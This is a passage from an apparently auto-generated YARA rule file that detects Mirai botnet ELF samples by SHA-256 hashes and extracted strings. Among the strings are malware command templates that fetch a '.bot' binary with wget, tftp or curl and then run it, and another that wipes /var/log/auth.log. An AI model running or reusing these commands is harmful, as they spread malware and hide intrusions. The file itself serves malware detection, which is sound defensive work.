      hash2 = "1ebc071c0427f1b7706c00d84940fde795b95d0f50500e4824694d7daccc5c80"
      hash3 = "1fd07b9ac091644e84c9bfd151c2dccf6be323decb096e4efb516de2ad170045"
      hash4 = "251e7e866484d05293bbba6850511153f3855ffb47d8b70c3363e90171946ee2"
      hash5 = "25d4d38704efbf607cc3bab7eefa61839fe7bd31da204689b0a2b665235e362e"
      hash6 = "264370b846197763bef4997522caa5baad2628f61d1da509d405038a45b91e1c"
      hash7 = "26f251ca933cc3dedacea77772e89d86633c93a824f4cb3a9f7461cd0becee94"
      hash8 = "2871105351d88ac4920d898f61a3f71f3c5825a80244a8b7c207b9bb4919e082"
      hash9 = "2be9ccee5bff062c276a0f95c010390dcdb21966e425e53948c24cafe85634fc"
      hash10 = "2ee9a42c7da356fc65fa94d18094ec12d967536a76a053437870646f3d0667f5"
      hash11 = "2f52dc2e2d937a2cfe6ec241f8c740ee59518cf7accf6a9770efe66b39b408f6"
      hash12 = "3022317d45af94ac80364444d10a207a7b6ade37274f4fe43acd59b2cc4742f8"
      hash13 = "355ff5d3af3cbd4dd678bee4407f826dfde28c431a3f1f66d26bba1a3248cc75"
      hash14 = "36db9aab7204d1a9d1859f45108614686c5e6021bddcf7a7fa120899d83334a0"
      hash15 = "36dd257bea506555a7a2f5a30228781e4949651e48dfba6c6ea3878ef30ad51b"
      hash16 = "37e39ec80792fb487504db381da4cbebe9737e6cc1ca2af95542483567ed1256"
      hash17 = "3faf435798bf284f72555578d9c55674772ad2d80ef3ed791ee0f0b3a59a1a1f"
      hash18 = "3fb73ed97b6102825b24e6986148d5c1ab447d681a0bf72c7f4e47f01300932e"
      hash19 = "4257f0992f19704aa44249881566901db0943a83f90c7ae563777473a7017b25"
      hash20 = "42f0f7da2d29a48c4a49bc12bc716111b7fd200a13c907df8b486e556b7c8fc0"
      hash21 = "435e67c0fcb0ac34b17754527f264833553ada8fa222aa37a0841b3faf6324a5"
      hash22 = "45c211c10c29dcda5602ada00279432484c6f2350c68eaad3048fca3ae1032ce"
      hash23 = "488a3964f1e8849bdaff87c32c0f33d785062285b2427e2f2e81f7b35240e0a7"
      hash24 = "4a11799891c39d0a2b8769f38d56ea8a3305997387fe7f1aee4f2c7b9171c190"
      hash25 = "4ccabe30fdb66f602194145df2a695093bf4cfa44a4903075ae6999e59903922"
      hash26 = "4d8d5b8acc632f220d84bbdb1347a93aab3686377ef306bba67a640be4afb9cd"
      hash27 = "4dcdbd21914f34f1c0b2a323da5a6840e7665ed56dc18b43a1638b721a1c2248"
      hash28 = "51e85925e9c3d37565a4cea9a69c86f039030bf3fcfae8750bb8ea474d9f676f"
      hash29 = "5245c572b41cb1257c070a75fa2fb6625c3d699172f89306aadd2bd32843546d"
      hash30 = "551cbc1698d7e07b9e00c4443098449f0a5ef09e14e7d861b757e853f77fe671"
      hash31 = "56ca29b158fe145953ba0165b56af3b0e533b8b155581e37174037abea8f3c60"
      hash32 = "572b6ab3c9095f00741c6c2f86f1d477fad4bb568b6cc4ac6ad8d7e42353cbbf"
      hash33 = "5943207f84c98e382df07e85b1f38ef487b78393f9e5ecaef95c385e2b33b830"
      hash34 = "5b18c9cbe6bccec88732d23ce39ba1d863cb8487cb0c557cbbd169b9f61e886f"
      hash35 = "5c9d399baaf6b4020909a3b8c97f61fa09846b9b27fc0882d4c8fa362042385a"
      hash36 = "5ebf996d40df9eec8476554d92ababf00975b620bbd046d09e20bf751a25eb42"
      hash37 = "5f343a4b7136f6e6216c07fa04adf0c2ca168c2142417d6fa3a13c665a110d63"
      hash38 = "61c23c332c5f8e1952f0343471cd43b4b2c3376e591835dcd1c547702dcc8594"
      hash39 = "6407da1321eb83154352e38a25826d58e1a503da2fb67a201025b60b0957d388"
      hash40 = "654d37fe82ca152c7091f355e1e3171ba4e82a11261e306239cd956d3dc92413"
      hash41 = "674e4453352dd7e3f7d47e7a37d4af508dc657343d5fba4c1162c587e5b829d1"
      hash42 = "68f89833bf74c49260c19d9369124cd173373e5e493fae27be88ba788aac8613"
      hash43 = "6b469574f60e7119dbc3b5a128caa8fbce342534d9f781a7e95cb9fc8c43c8bd"
      hash44 = "6bf02c0a0b01dbbeb4059785dd26ecbb5c34fb48f8855901e06ac94183776505"
      hash45 = "6bfe1ef9772b6e98ce59df39a922e07ec789e8a629f38eed755aaa7e74382802"
      hash46 = "6c9a81f9274570fe1ea67285664d25a43273707ac4eddbfe979d7af5c2f734a7"
   strings:
      $s1 = "/bin/busybox wget %s%s -O .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s2 = "/bin/busybox tftp -g %s -P %u -r %s -l .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s3 = "curl %s%s -o .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '25.00'*/
      $s4 = "echo > /var/log/auth.log 2>/dev/null" fullword ascii /* score: '23.00'*/
      $s5 = "[%s:%d->%s:%d] USER-AGENT: %s" fullword ascii /* score: '22.50'*/
      $s6 = "[%s:%d->%s:%d] PASSWORD: %s" fullword ascii /* score: '21.50'*/
      $s7 = "Coded at 3 AM on Adderall - you can tell" fullword ascii /* score: '20.00'*/
      $s8 = "sysctl -w net.ipv6.conf.all.forwarding=1 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s9 = "[HTTP POST/PUT] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s10 = "[PRIORITY - %s] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s11 = "user-agent: " fullword ascii /* score: '17.00'*/
      $s12 = "User-Agent: curl" fullword ascii /* score: '17.00'*/
      $s13 = "User-Agent: wget" fullword ascii /* score: '17.00'*/
      $s14 = "sysctl -w net.ipv4.ip_forward=1 2>/dev/null" fullword ascii /* score: '17.00'*/
      $s15 = "User-Agent: Wget/1.12 (linux-gnu)" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__1db1e5bb_Mirai_signature__33334d1b_Mirai_signature__3a44b78f_Mirai_signature__6174da43_3 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1db1e5bb.elf, Mirai(signature)_33334d1b.elf, Mirai(signature)_3a44b78f.elf, Mirai(signature)_6174da43.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1db1e5bbeded64602a9e4f373fa5528379dd5c4e061615e8eaea20ebc5dc9978"
      hash2 = "33334d1bf4a80c1e151b8d550b730c2da797cd67b039d756065108a2638ef63b"
      hash3 = "3a44b78f278da898c81bd1c7c5f894e6abebecb2a00fd99895c0da898ad075e3"
      hash4 = "6174da43dd0e045dcd0a55746bf4229b564a8fead60329fb93e754693d60a3f1"
   strings:
      $s1 = "SPOOFEDHASH" fullword ascii /* score: '19.50'*/
      $s2 = "dakuexecbin" fullword ascii /* score: '19.00'*/
      $s3 = "sefaexec" fullword ascii /* score: '16.00'*/
      $s4 = "1337SoraLOADER" fullword ascii /* score: '13.00'*/
      $s5 = "deexec" fullword ascii /* score: '13.00'*/
      $s6 = "SO190Ij1X" fullword ascii /* base64 encoded string ';_t"=W' */ /* score: '11.00'*/
      $s7 = "GhostWuzHere666" fullword ascii /* score: '10.00'*/
      $s8 = "airdropmalware" fullword ascii /* score: '10.00'*/
      $s9 = "trojan" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s10 = "scanspc" fullword ascii /* score: '9.00'*/
      $s11 = "scanmpsl" fullword ascii /* score: '9.00'*/
      $s12 = "scanmips" fullword ascii /* score: '9.00'*/
      $s13 = "scanppc" fullword ascii /* score: '9.00'*/
      $s14 = "ddrwelper" fullword ascii /* score: '8.00'*/
      $s15 = "pussyfartlmaojk" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__2ff3f662_Mirai_signature__30be5917_Mirai_signature__32ac2cc4_Mirai_signature__3925be6e_Mirai_signature__3b_4 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_2ff3f662.elf, Mirai(signature)_30be5917.elf, Mirai(signature)_32ac2cc4.elf, Mirai(signature)_3925be6e.elf, Mirai(signature)_3be62d68.elf, Mirai(signature)_3d23aea9.elf, Mirai(signature)_3e63a0e4.elf, Mirai(signature)_3ec3b485.elf, Mirai(signature)_3effb150.elf, Mirai(signature)_3f6cfadb.elf, Mirai(signature)_421688ae.elf, Mirai(signature)_4afabac3.elf, Mirai(signature)_4e8b3e67.elf, Mirai(signature)_589f3920.elf, Mirai(signature)_653980e4.elf, Mirai(signature)_654826d8.elf, Mirai(signature)_67036276.elf, Mirai(signature)_6a5af377.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2ff3f662547357a56e86f532065c6f4fa727e7841c0973acb33631b557b6ca9b"
      hash2 = "30be59170a00a2e7e2113c8ded7d381cc15eef21cc59de62f3ea1e326b7d7755"
      hash3 = "32ac2cc47e06558204030a88dc64b3f8b2ad024f7e7d95082de0bf7efd7cb7fc"
      hash4 = "3925be6e76a13bc16e8b3793bb72e8dccb6942ad0473eda1da310775ddc22119"
      hash5 = "3be62d68457387363efdf7af26ba9bc30427ff95d7fe8a72c477bf669ed2c88a"
      hash6 = "3d23aea993233b117eb75734d41c9b6ace877bbb275c5703b92143ada30c8290"
      hash7 = "3e63a0e4da4100a0e27f182f20a0aad799deae7793bb812c61ac81d6c9dcffad"
      hash8 = "3ec3b48584fe2bdf81b9b6a5486092ef14318e860f3b269f8d08dd71a87a73a1"
      hash9 = "3effb150dc2e695a8d7da372fc1adf107a5865433bf6d002c000f24acdd8902d"
      hash10 = "3f6cfadb698f450df2cdf6773d73ebce336eaa21bcd85e5e8271b382ac66841b"
      hash11 = "421688aeb7a85e68e7cd6cdf36c34039a01c2d51a266b66f8d4d93cdad12bd0a"
      hash12 = "4afabac36401a8e799ec775086c6ec86a5309f9226deb3bd39505ffffefe3345"
      hash13 = "4e8b3e671dbca41ea10bdb7ee63f7c71bbe141c9aef86aa1f39e1ebdf801df41"
      hash14 = "589f3920e6d5da2b5131434a428c0aa1bf6631e883372f4b9f3d1b9b9a3efa7b"
      hash15 = "653980e4216d4bf61bde99f32cee0481d0628eb8dccd70c5e2aead820eebf446"
      hash16 = "654826d8630bf9b3276e8c6ba79635a793efd946cd99df89f6e2cc52917bde1c"
      hash17 = "67036276b4fbe0afd07661cd49c3ce727a84141c77684d520f47a95323d59dbd"
      hash18 = "6a5af377c1edc2ad608b197a0d6549650ad693230e678812a1e97bc6ffc5bf5e"
   strings:
      $s1 = "_Unwind_decode_target2" fullword ascii /* score: '16.00'*/
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s3 = "__gnu_unwind_execute" fullword ascii /* score: '14.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii /* score: '14.00'*/
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii /* score: '11.00'*/
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii /* score: '11.00'*/
      $s8 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s9 = "_Unwind_VRS_Get" fullword ascii /* score: '9.00'*/
      $s10 = "_Unwind_EHT_Header" fullword ascii /* score: '9.00'*/
      $s11 = "bitpattern" fullword ascii /* score: '8.00'*/
      $s12 = "fnstart" fullword ascii /* score: '8.00'*/
      $s13 = "fnoffset" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__1d5bb24e_Mirai_signature__22dc51a7_Mirai_signature__22e98717_Mirai_signature__2779127d_Mirai_signature__28_5 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_1d5bb24e.elf, Mirai(signature)_22dc51a7.elf, Mirai(signature)_22e98717.elf, Mirai(signature)_2779127d.elf, Mirai(signature)_284232d5.elf, Mirai(signature)_2d76f2fb.elf, Mirai(signature)_307bd661.elf, Mirai(signature)_32d84ec7.elf, Mirai(signature)_35f14e90.elf, Mirai(signature)_3d7530b2.elf, Mirai(signature)_4062f9b2.elf, Mirai(signature)_42f1c49e.elf, Mirai(signature)_453812f9.elf, Mirai(signature)_46f381b3.elf, Mirai(signature)_485d6451.elf, Mirai(signature)_48d4ab62.elf, Mirai(signature)_497371c9.elf, Mirai(signature)_4ccd3724.elf, Mirai(signature)_5048384c.elf, Mirai(signature)_5466fc78.elf, Mirai(signature)_55864344.elf, Mirai(signature)_58a4441b.elf, Mirai(signature)_5d363871.elf, Mirai(signature)_5dd8295d.elf, Mirai(signature)_5f7fc8f6.elf, Mirai(signature)_62098781.elf, Mirai(signature)_67f0fa8b.elf, Mirai(signature)_6b36c951.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5bb24e8127095d5e0a337be1a25339a75c4f2bd3522de8797549ed0710162e"
      hash2 = "22dc51a72f5b30374a702a81c45af898ecabcf1e0ea28c46ff9e10533a6e071b"
      hash3 = "22e98717329a93b5e31869e8e239defb08e9d32ab388067062e585b98194efa8"
      hash4 = "2779127d1abdde4a1746670be4adcb6db44dc017cda5ba1441453ff10fe39824"
      hash5 = "284232d59ff169e270a09eb2edef558f9d8efb4ee62c91ce980d792f300586c5"
      hash6 = "2d76f2fba21b5740869cf0060a1f2562a08ae6e329054fa65174bd4e4f8db8fb"
      hash7 = "307bd661e890535ff5bf14aa7f17128d7feb1006a04bb26965b034d5fe214ca3"
      hash8 = "32d84ec7a5f4c8c081fac153b98d3ad0855360e17b1ee505bc431544f71f2f65"
      hash9 = "35f14e909ac8b7fb6be9d601a56e671160a3fb971435131cf9d183cc1105d67b"
      hash10 = "3d7530b2277449d52dcdac5f911ce7f4566bad04614fa1d65ae873024fdbecb5"
      hash11 = "4062f9b240a837bf574cf4b90f7312894ec18906c3640d167f590a26c9dc87e1"
      hash12 = "42f1c49e584938cd0db4984e56fcd22be5876cb83cedfdcb8eed0625beb053f1"
      hash13 = "453812f9ec23c1df6e78226f471673cf10358e475af0975ca08c87f442af2578"
      hash14 = "46f381b3d882cdd0263a8321f0160bf6de07fac1df61482be91ddb8c87e9ddb7"
      hash15 = "485d6451a00c6c72a0b5f357b75f14ce846a9ae8ca3f3978069d7b8831ff4d87"
      hash16 = "48d4ab62718334ed89761c20287161a165671724c67a066d52712f291d9ebd50"
      hash17 = "497371c90b617e3735b8c6bb8b616dcc01210c103add22c31da827d1b03efc94"
      hash18 = "4ccd37241e4301b2c05dfbe0a4b8683edcc3b86d1d5c116b05493fea3d3e09f0"
      hash19 = "5048384c6a681d9b5df1dfce60ef133a9c0c6a3331db8389a56dcd1a51fb9b08"
      hash20 = "5466fc78fc5ffbfaf0fb1f88084fad6514f8b6985ad4a11685fddcb989fe690d"
      hash21 = "5586434483d5733070cbe35465e231466faa4a224e0fcb10f8fbf51ca05bdf16"
      hash22 = "58a4441b65d6f3a28eb64dbabdfe667e0e6f3101f6efb855b5f488002929dc82"
      hash23 = "5d36387141534152179108827ad90dc792d135d3660df93d8ebfd2392c0d240e"
      hash24 = "5dd8295dc7af5ad62d02f93bb7affc29c1206541356bfb1d90efa7cbcf94fc3f"
      hash25 = "5f7fc8f6f5d1acadfd7ead7ef70cca05e9ae407fabd1fd43013a6d12c99de727"
      hash26 = "62098781511c8b01bf052da1151d60b3ce8c42c557591c7a90ba6f7f02f96060"
      hash27 = "67f0fa8bb928264b187c86a0309bd3dcb334bd370e767b25b099dabb33b59f14"
      hash28 = "6b36c9510867769c13bc4d67b7341343a1015de7514dd97083b20a19c3891207"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s3 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s4 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s5 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
      $s6 = "%s():%i: running ctors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s7 = "%s():%i: Lib: %s already opened" fullword ascii /* score: '12.50'*/
      $s8 = "%s():%i: __address: %p  __info: %p" fullword ascii /* score: '12.50'*/
      $s9 = "%s():%i: running dtors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s10 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */ /* score: '11.00'*/
      $s11 = "////////////," fullword ascii /* reversed goodware string ',////////////' */ /* score: '11.00'*/
      $s12 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */ /* score: '11.00'*/
      $s13 = "searching RUNPATH='%s'" fullword ascii /* score: '10.00'*/
      $s14 = "%s():%i: unmapping: %s" fullword ascii /* score: '9.50'*/
      $s15 = "%s():%i: Symbol \"%s\" at %p" fullword ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__23da5558_Mirai_signature__2b37a8e3_Mirai_signature__3063b1a9_Mirai_signature__31a18daa_Mirai_signature__32_6 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_23da5558.elf, Mirai(signature)_2b37a8e3.elf, Mirai(signature)_3063b1a9.elf, Mirai(signature)_31a18daa.elf, Mirai(signature)_327f7742.elf, Mirai(signature)_355bf0ff.elf, Mirai(signature)_36bb77da.elf, Mirai(signature)_3aea5a40.elf, Mirai(signature)_3b46c349.elf, Mirai(signature)_3bef84f1.elf, Mirai(signature)_3f6cfadb.elf, Mirai(signature)_44999d62.elf, Mirai(signature)_4da560aa.elf, Mirai(signature)_4ff2888d.elf, Mirai(signature)_5d9434fc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23da555858c0104bd60b3e918efd5d9f362b8cf4c4523224f3f39dd4a47ad2f7"
      hash2 = "2b37a8e3ec622f8ae9c3ac30aef1dfbb4af56ebe9a66675a0c40a5c61478d995"
      hash3 = "3063b1a98d934b80c77ec0b515220a62eb41af84be1bde5fb2d65757e5f32c6b"
      hash4 = "31a18daa6603dd7005b15fd5cb925d7f7096aab83cf191825b30e58b3cbf8633"
      hash5 = "327f774238181fdd64123535b46bfc91dc7223dddfc0cd9d8bec50a1f5c9616b"
      hash6 = "355bf0ff2d4b5c1344d3e4c4a368d2d64fa95654755de0944496d8b535c6dc4b"
      hash7 = "36bb77da16b12417510a0663735488cf4393e02518bbcf39e05d23c1449ae3ed"
      hash8 = "3aea5a400d17dc668a67377eb012a5db00909644152679f834659dbac35e37f2"
      hash9 = "3b46c349abed5ce9921e875eea04c890d03f1950d653a8a4821aa2a68d8a2970"
      hash10 = "3bef84f1d7f50a9c06d68d1b43c5a124c698a704d89f1c2b050563fa1c119b9d"
      hash11 = "3f6cfadb698f450df2cdf6773d73ebce336eaa21bcd85e5e8271b382ac66841b"
      hash12 = "44999d62550d79ea67ace000bfe5d83cafd6678decb14da5b841db9d33de70e0"
      hash13 = "4da560aad4f0960291ff354fca76f10d16864614d04d8c49863ef5c5a837127b"
      hash14 = "4ff2888d814764a478499fa27ba3831f9ce0395aacdd0da779127d9027a778e1"
      hash15 = "5d9434fc00c92e10bcf72fdce59c9546ee52d60df8ac5af9d525f25404576b98"
   strings:
      $s1 = "txt.awsdns-hostedzone-info.com" fullword ascii /* score: '26.00'*/
      $s2 = "execute_xor_commands" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s4 = "ipv6.google.com" fullword ascii /* score: '21.00'*/
      $s5 = "any.microsoft-dns.com" fullword ascii /* score: '21.00'*/
      $s6 = "dkim20._domainkey.godaddy.com" fullword ascii /* score: '21.00'*/
      $s7 = "any.dns.oracle.com" fullword ascii /* score: '21.00'*/
      $s8 = "dnssec-failover.cloudflare.com" fullword ascii /* score: '21.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s11 = "any.cdn77.com" fullword ascii /* score: '18.00'*/
      $s12 = "large-dns.akamai.com" fullword ascii /* score: '18.00'*/
      $s13 = "kill_process" fullword ascii /* score: '15.00'*/
      $s14 = "killer_process" fullword ascii /* score: '15.00'*/
      $s15 = "process_killer_loop" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__23da5558_Mirai_signature__3063b1a9_Mirai_signature__31a18daa_Mirai_signature__327f7742_Mirai_signature__35_7 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_23da5558.elf, Mirai(signature)_3063b1a9.elf, Mirai(signature)_31a18daa.elf, Mirai(signature)_327f7742.elf, Mirai(signature)_355bf0ff.elf, Mirai(signature)_3bef84f1.elf, Mirai(signature)_4da560aa.elf, Mirai(signature)_4ff2888d.elf, Mirai(signature)_5d9434fc.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23da555858c0104bd60b3e918efd5d9f362b8cf4c4523224f3f39dd4a47ad2f7"
      hash2 = "3063b1a98d934b80c77ec0b515220a62eb41af84be1bde5fb2d65757e5f32c6b"
      hash3 = "31a18daa6603dd7005b15fd5cb925d7f7096aab83cf191825b30e58b3cbf8633"
      hash4 = "327f774238181fdd64123535b46bfc91dc7223dddfc0cd9d8bec50a1f5c9616b"
      hash5 = "355bf0ff2d4b5c1344d3e4c4a368d2d64fa95654755de0944496d8b535c6dc4b"
      hash6 = "3bef84f1d7f50a9c06d68d1b43c5a124c698a704d89f1c2b050563fa1c119b9d"
      hash7 = "4da560aad4f0960291ff354fca76f10d16864614d04d8c49863ef5c5a837127b"
      hash8 = "4ff2888d814764a478499fa27ba3831f9ce0395aacdd0da779127d9027a778e1"
      hash9 = "5d9434fc00c92e10bcf72fdce59c9546ee52d60df8ac5af9d525f25404576b98"
   strings:
      $s1 = "Host: %s.com" fullword ascii /* score: '26.00'*/
      $s2 = "X-Forwarded-Host: %s.com" fullword ascii /* score: '26.00'*/
      $s3 = "Origin: https://%s.com" fullword ascii /* score: '24.00'*/
      $s4 = "X-Akamai-Origin: https://www.example.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.microsoft.com" fullword ascii /* score: '21.00'*/
      $s6 = "Origin: https://www.instagram.com" fullword ascii /* score: '21.00'*/
      $s7 = "Origin: https://www.apple.com" fullword ascii /* score: '21.00'*/
      $s8 = "Referer: https://www.microsoft.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.instagram.com/" fullword ascii /* score: '17.00'*/
      $s10 = "Referer: https://www.apple.com/" fullword ascii /* score: '17.00'*/
      $s11 = "user-agent: %s" fullword ascii /* score: '17.00'*/
      $s12 = "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3" ascii /* score: '16.00'*/
      $s13 = "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3" ascii /* score: '16.00'*/
      $s14 = "HttpUserAgents" fullword ascii /* score: '15.00'*/
      $s15 = "GET %s HTTP/3.0" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__23da5558_Mirai_signature__253adc3b_Mirai_signature__2b37a8e3_Mirai_signature__2ff3f662_Mirai_signature__30_8 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_23da5558.elf, Mirai(signature)_253adc3b.elf, Mirai(signature)_2b37a8e3.elf, Mirai(signature)_2ff3f662.elf, Mirai(signature)_3063b1a9.elf, Mirai(signature)_30be5917.elf, Mirai(signature)_31a18daa.elf, Mirai(signature)_327f7742.elf, Mirai(signature)_32ac2cc4.elf, Mirai(signature)_355bf0ff.elf, Mirai(signature)_36bb77da.elf, Mirai(signature)_38e02ed8.elf, Mirai(signature)_3925be6e.elf, Mirai(signature)_3aea5a40.elf, Mirai(signature)_3b46c349.elf, Mirai(signature)_3be62d68.elf, Mirai(signature)_3bef84f1.elf, Mirai(signature)_3d23aea9.elf, Mirai(signature)_3e63a0e4.elf, Mirai(signature)_3ec3b485.elf, Mirai(signature)_3effb150.elf, Mirai(signature)_3f6cfadb.elf, Mirai(signature)_420c7996.elf, Mirai(signature)_421688ae.elf, Mirai(signature)_44046931.elf, Mirai(signature)_44381eff.elf, Mirai(signature)_44999d62.elf, Mirai(signature)_4afabac3.elf, Mirai(signature)_4da560aa.elf, Mirai(signature)_4e872d3b.elf, Mirai(signature)_4e8b3e67.elf, Mirai(signature)_4f248a58.elf, Mirai(signature)_4ff2888d.elf, Mirai(signature)_589f3920.elf, Mirai(signature)_5a1d9183.elf, Mirai(signature)_5d9434fc.elf, Mirai(signature)_653980e4.elf, Mirai(signature)_654826d8.elf, Mirai(signature)_67036276.elf, Mirai(signature)_6a5af377.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "23da555858c0104bd60b3e918efd5d9f362b8cf4c4523224f3f39dd4a47ad2f7"
      hash2 = "253adc3bb48435122f8c3f39580b29c3ad66b88e1ac98e52420abf39bdbbba4e"
      hash3 = "2b37a8e3ec622f8ae9c3ac30aef1dfbb4af56ebe9a66675a0c40a5c61478d995"
      hash4 = "2ff3f662547357a56e86f532065c6f4fa727e7841c0973acb33631b557b6ca9b"
      hash5 = "3063b1a98d934b80c77ec0b515220a62eb41af84be1bde5fb2d65757e5f32c6b"
      hash6 = "30be59170a00a2e7e2113c8ded7d381cc15eef21cc59de62f3ea1e326b7d7755"
      hash7 = "31a18daa6603dd7005b15fd5cb925d7f7096aab83cf191825b30e58b3cbf8633"
      hash8 = "327f774238181fdd64123535b46bfc91dc7223dddfc0cd9d8bec50a1f5c9616b"
      hash9 = "32ac2cc47e06558204030a88dc64b3f8b2ad024f7e7d95082de0bf7efd7cb7fc"
      hash10 = "355bf0ff2d4b5c1344d3e4c4a368d2d64fa95654755de0944496d8b535c6dc4b"
      hash11 = "36bb77da16b12417510a0663735488cf4393e02518bbcf39e05d23c1449ae3ed"
      hash12 = "38e02ed85d0f7629e13f54489a430681477fd9694f35d4e864cf616708261372"
      hash13 = "3925be6e76a13bc16e8b3793bb72e8dccb6942ad0473eda1da310775ddc22119"
      hash14 = "3aea5a400d17dc668a67377eb012a5db00909644152679f834659dbac35e37f2"
      hash15 = "3b46c349abed5ce9921e875eea04c890d03f1950d653a8a4821aa2a68d8a2970"
      hash16 = "3be62d68457387363efdf7af26ba9bc30427ff95d7fe8a72c477bf669ed2c88a"
      hash17 = "3bef84f1d7f50a9c06d68d1b43c5a124c698a704d89f1c2b050563fa1c119b9d"
      hash18 = "3d23aea993233b117eb75734d41c9b6ace877bbb275c5703b92143ada30c8290"
      hash19 = "3e63a0e4da4100a0e27f182f20a0aad799deae7793bb812c61ac81d6c9dcffad"
      hash20 = "3ec3b48584fe2bdf81b9b6a5486092ef14318e860f3b269f8d08dd71a87a73a1"
      hash21 = "3effb150dc2e695a8d7da372fc1adf107a5865433bf6d002c000f24acdd8902d"
      hash22 = "3f6cfadb698f450df2cdf6773d73ebce336eaa21bcd85e5e8271b382ac66841b"
      hash23 = "420c79968123a4bb09e9ff5640ab32da1eb0677ea1a9516f70f40a9dfbefa46c"
      hash24 = "421688aeb7a85e68e7cd6cdf36c34039a01c2d51a266b66f8d4d93cdad12bd0a"
      hash25 = "440469312d3679107da05cf3f222ec3042e01dab0cef3cb94568113ccb57d277"
      hash26 = "44381effdd350359a39db85ada72c070037c844ee032efd1b50cfa99e28f3325"
      hash27 = "44999d62550d79ea67ace000bfe5d83cafd6678decb14da5b841db9d33de70e0"
      hash28 = "4afabac36401a8e799ec775086c6ec86a5309f9226deb3bd39505ffffefe3345"
      hash29 = "4da560aad4f0960291ff354fca76f10d16864614d04d8c49863ef5c5a837127b"
      hash30 = "4e872d3be5179467ff6f82e474edb840fbb2a20823e6d06cfee931efcc127495"
      hash31 = "4e8b3e671dbca41ea10bdb7ee63f7c71bbe141c9aef86aa1f39e1ebdf801df41"
      hash32 = "4f248a582a083d8d67d18ae8c2acaa4cfc88b00d882c4f6ba256148b5db96b73"
      hash33 = "4ff2888d814764a478499fa27ba3831f9ce0395aacdd0da779127d9027a778e1"
      hash34 = "589f3920e6d5da2b5131434a428c0aa1bf6631e883372f4b9f3d1b9b9a3efa7b"
